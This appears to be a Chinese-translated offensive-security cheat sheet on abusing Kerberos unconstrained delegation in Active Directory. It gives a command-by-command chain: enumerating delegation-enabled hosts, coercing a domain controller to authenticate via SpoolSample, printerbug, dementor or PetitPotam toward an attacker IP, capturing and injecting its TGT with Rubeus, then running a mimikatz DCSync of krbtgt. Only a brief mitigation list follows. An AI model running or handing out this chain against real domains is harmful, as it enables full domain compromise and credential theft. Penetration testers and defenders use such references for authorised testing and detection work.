# Kerberos 委派 - 非约束委派 (Unconstrained Delegation)

> 用户发送服务票据 (ST) 以及自身的 TGT 来访问某服务，然后该服务可以使用用户的 TGT 为用户向其他任何服务请求 ST 并模拟该用户。
> 当用户向启用了非约束的 Kerberos 委派权限的计算机进行身份验证时，经过身份验证的用户的 TGT 票据会保存在该计算机的内存中。

:warning: 在 Windows 2000 中，非约束委派曾是唯一可用的选项

> **警告 (Warning)**
> 如果你想要获取 Kerberos 票据，请记住强制身份验证目标为一个主机名 (HOSTNAME)

## 结合非约束委派滥用 SpoolService 漏洞 (SpoolService Abuse with Unconstrained Delegation)

目标是利用计算机帐户和 SpoolService 漏洞获取 DC Sync 权限。

**要求 (Requirements)**:

- 拥有属性 **Trust this computer for delegation to any service (Kerberos only)** (信任此计算机来委派任何服务 (仅 Kerberos)) 的对象
- 必须有 **ADS_UF_TRUSTED_FOR_DELEGATION**
- 不能有 **ADS_UF_NOT_DELEGATED** 标志
- 用户不能位于 **Protected Users** (受保护用户) 组中
- 用户不能有 **Account is sensitive and cannot be delegated** (帐户敏感，无法被委派) 标志

### 查找委派 (Find delegation)

:warning: : 域控制器通常默认启用非约束委派。
检查 `TRUSTED_FOR_DELEGATION` 属性。

- [ADModule](https://github.com/samratashok/ADModule)

  ```powershell
  # 来自 https://github.com/samratashok/ADModule
  PS> Get-ADComputer -Filter {TrustedForDelegation -eq $True}
  ```

- [bloodyAD](https://github.com/CravateRouge/bloodyAD)

  ```ps1
  bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(objectCategory=Computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))' --attr sAMAccountName,userAccountControl
  ```
  
- [ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump)

  ```powershell
  $> ldapdomaindump -u "DOMAIN\\Account" -p "Password123*" 10.10.10.10   
  grep TRUSTED_FOR_DELEGATION domain_computers.grep
  ```

- [netexec 模块 (netexec module)](https://github.com/Pennyw0rth/NetExec/wiki)

  ```powershell
  nxc ldap 10.10.10.10 -u username -p password --trusted-for-delegation
  ```

- BloodHound: `MATCH (c:Computer {unconstraineddelegation:true}) RETURN c`
- Powershell Active Directory 模块: `Get-ADComputer -LDAPFilter "(&(objectCategory=Computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" -Properties DNSHostName,userAccountControl`

### SpoolService 状态 (SpoolService status)

检查 spool 服务是否在远程主机上运行

```powershell
ls \\dc01\pipe\spoolss
python rpcdump.py DOMAIN/user:password@10.10.10.10
```

### 使用 Rubeus 监控 (Monitor with Rubeus)

监控来自 Rubeus 的传入连接。

```powershell
Rubeus.exe monitor /interval:1 
```

### 强制域控回连 (Force a connect back from the DC)

由于存在非约束委派，计算机帐户 (DC$) 的 TGT 会保存在分配了非约束委派的计算机内存中。默认情况下，域控的计算机帐户对域对象具有 DCSync 权限。

> SpoolSample 是一个利用 MS-RPRN RPC 接口中的一项“特性”强制 Windows 主机向任意服务器进行身份验证的 PoC 工具。

```powershell
# 来自 https://github.com/leechristensen/SpoolSample
.\SpoolSample.exe VICTIM-DC-NAME UNCONSTRAINED-SERVER-DC-NAME
.\SpoolSample.exe DC01.HACKER.LAB HELPDESK.HACKER.LAB
# DC01.HACKER.LAB 是我们要攻陷的域控
# HELPDESK.HACKER.LAB 是我们控制的启用了委派的机器。

# 来自 https://github.com/dirkjanm/krbrelayx
printerbug.py 'domain/username:password'@<VICTIM-DC-NAME> <UNCONSTRAINED-SERVER-DC-NAME>

# 来自 https://gist.github.com/3xocyte/cfaf8a34f76569a8251bde65fe69dccc#gistcomment-2773689
python dementor.py -d domain -u username -p password <UNCONSTRAINED-SERVER-DC-NAME> <VICTIM-DC-NAME>
```

如果攻击成功，你将获得域控制器的 TGT。

### 加载票据 (Load the ticket)

从 Rubeus 的输出中提取 base64 格式的 TGT，并将其加载至当前会话中。

```powershell
.\Rubeus.exe asktgs /ticket:<ticket base64> /service:LDAP/dc.lab.local,cifs/dc.lab.local /ptt
```

或者，你也可以使用 Mimikatz 获取票据: `mimikatz # sekurlsa::tickets`

之后你可以进行 DCsync 操作或其他攻击动作 : `mimikatz # lsadump::dcsync /user:HACKER\krbtgt`

### 缓解措施 (Mitigation)

- 确保敏感帐户无法被委派 (Ensure sensitive accounts cannot be delegated)
- 禁用后台打印后台处理程序服务 (Disable the Print Spooler Service)

## 结合非约束委派滥用 MS-EFSRPC 漏洞 (MS-EFSRPC Abuse with Unconstrained Delegation)

使用 `PetitPotam`(而不是 SpoolSample) 来强制目标机器发起一次回连通信。

```bash
# 强制发起回连通信 (Coerce the callback)
git clone https://github.com/topotam/PetitPotam
python3 petitpotam.py -d $DOMAIN -u $USER -p $PASSWORD $ATTACKER_IP $TARGET_IP
python3 petitpotam.py -d '' -u '' -p '' $ATTACKER_IP $TARGET_IP

# 提取票据 (Extract the ticket)
.\Rubeus.exe asktgs /ticket:<ticket base64> /ptt
```

## 参考资料 (References)

- [Exploiting Unconstrained Delegation - Riccardo Ancarani - 28 APRIL 2019](https://www.riccardoancarani.it/exploiting-unconstrained-delegation/)
- [Hunting in Active Directory: Unconstrained Delegation & Forests Trusts - Roberto Rodriguez - Nov 28, 2018](https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1)
- [Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory - Elad Shamir - 28 January 2019](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
